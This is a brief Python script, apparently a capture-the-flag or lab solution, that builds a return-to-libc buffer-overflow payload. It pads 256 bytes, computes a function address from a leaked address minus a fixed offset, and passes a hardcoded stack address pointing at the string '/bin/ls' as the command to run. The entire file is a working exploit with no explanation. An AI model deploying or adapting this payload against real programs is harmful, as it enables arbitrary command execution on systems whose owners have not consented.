import struct

# got = 0xf7de18f0

print('A' * 256 + 'BBBB' + struct.pack('I', int(input(), 16) - 176192) + 'CCCC' + struct.pack('I', 0xffffd048) + '/bin/ls')
